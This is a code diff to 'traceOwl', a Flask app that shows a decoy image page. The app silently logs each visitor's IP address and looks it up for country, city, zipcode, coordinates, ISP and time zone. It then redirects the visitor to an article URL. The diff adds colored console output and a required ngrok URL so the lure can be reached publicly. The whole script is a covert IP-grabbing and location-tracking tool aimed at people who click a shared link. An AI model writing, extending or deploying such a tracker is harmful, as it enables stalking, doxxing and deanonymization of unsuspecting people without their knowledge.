@@ -12,27 +12,28 @@ app = Flask(__name__)
 image_url = ''
 link_url = ''
 page_title = ''
+API_KEY = ''
 
 # Function to get geolocation and format it
 def get_geolocation(ip):
     url = f"https://api.ipgeolocation.io/ipgeo?apiKey={API_KEY}&ip={ip}"
     response = requests.get(url)
     data = response.json()
-    
+
     formatted_data = f"""
-    IP: {data.get('ip')}
-    Continent: {data.get('continent_name')}
-    Country: {data.get('country_name')}
-    Country Code: {data.get('country_code2')}
-    State: {data.get('state_prov')}
-    City: {data.get('city')}
-    Zipcode: {data.get('zipcode')}
-    Latitude: {data.get('latitude')}
-    Longitude: {data.get('longitude')}
-    ISP: {data.get('isp')}
-    Organization: {data.get('organization')}
-    Time Zone: {data.get('time_zone', {}).get('name')}
-    Current Time: {data.get('time_zone', {}).get('current_time')}
+    {Fore.YELLOW}IP:{Fore.RESET} {Fore.GREEN}{data.get('ip')}{Fore.RESET}
+    {Fore.YELLOW}Continent:{Fore.RESET} {Fore.GREEN}{data.get('continent_name')}{Fore.RESET}
+    {Fore.YELLOW}Country:{Fore.RESET} {Fore.GREEN}{data.get('country_name')}{Fore.RESET}
+    {Fore.YELLOW}Country Code:{Fore.RESET} {Fore.GREEN}{data.get('country_code2')}{Fore.RESET}
+    {Fore.YELLOW}State:{Fore.RESET} {Fore.GREEN}{data.get('state_prov')}{Fore.RESET}
+    {Fore.YELLOW}City:{Fore.RESET} {Fore.GREEN}{data.get('city')}{Fore.RESET}
+    {Fore.YELLOW}Zipcode:{Fore.RESET} {Fore.GREEN}{data.get('zipcode')}{Fore.RESET}
+    {Fore.YELLOW}Latitude:{Fore.RESET} {Fore.GREEN}{data.get('latitude')}{Fore.RESET}
+    {Fore.YELLOW}Longitude:{Fore.RESET} {Fore.GREEN}{data.get('longitude')}{Fore.RESET}
+    {Fore.YELLOW}ISP:{Fore.RESET} {Fore.GREEN}{data.get('isp')}{Fore.RESET}
+    {Fore.YELLOW}Organization:{Fore.RESET} {Fore.GREEN}{data.get('organization')}{Fore.RESET}
+    {Fore.YELLOW}Time Zone:{Fore.RESET} {Fore.GREEN}{data.get('time_zone', {}).get('name')}{Fore.RESET}
+    {Fore.YELLOW}Current Time:{Fore.RESET} {Fore.GREEN}{data.get('time_zone', {}).get('current_time')}{Fore.RESET}
     """
     return formatted_data.strip()
 
@@ -40,6 +41,7 @@ def get_geolocation(ip):
 def index():
     user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     geolocation_data = get_geolocation(user_ip)
+    # Save or process geolocation data as needed
     print(Fore.GREEN + f"Geolocation for {user_ip}:\n{geolocation_data}")
     return redirect(link_url)
 
@@ -64,13 +66,14 @@ def image_page():
     return render_template_string(page_template)
 
 def main():
-    global image_url, link_url, page_title
+    global image_url, link_url, page_title, API_KEY
 
     parser = argparse.ArgumentParser(description='traceOwl Configuration')
     parser.add_argument('--image', type=str, help='URL of the image')
     parser.add_argument('--article', type=str, help='URL of the redirection article')
     parser.add_argument('--title', type=str, help='Title of the webpage')
     parser.add_argument('--apikey', type=str, help='API key for ipgeolocation.io', required=True)
+    parser.add_argument('--ngrok', type=str, help='Ngrok URL', required=True)
 
     args = parser.parse_args()
 
@@ -81,11 +84,12 @@ def main():
     if args.title:
         page_title = args.title
     if args.apikey:
-        global API_KEY
         API_KEY = args.apikey
+    if args.ngrok:
+        ngrok_url = args.ngrok
 
-    if not image_url or not link_url or not page_title:
-        print(Fore.RED + "ERROR: The URLs for the image, the article, and the title must be set.")
+    if not image_url or not ngrok_url or not page_title or not link_url:
+        print(Fore.RED + "ERROR: The URLs for the image, the article, the ngrok URL, and the title must be set.")
         return
 
     print(Fore.CYAN + """
@@ -101,6 +105,7 @@ def main():
     """ + Style.RESET_ALL)
 
     print(Fore.GREEN + f"Image URL: {image_url}")
+    print(Fore.GREEN + f"Ngrok URL: {ngrok_url}")
     print(Fore.GREEN + f"Redirection URL: {link_url}")
     print(Fore.GREEN + f"Page Title: {page_title}")
 
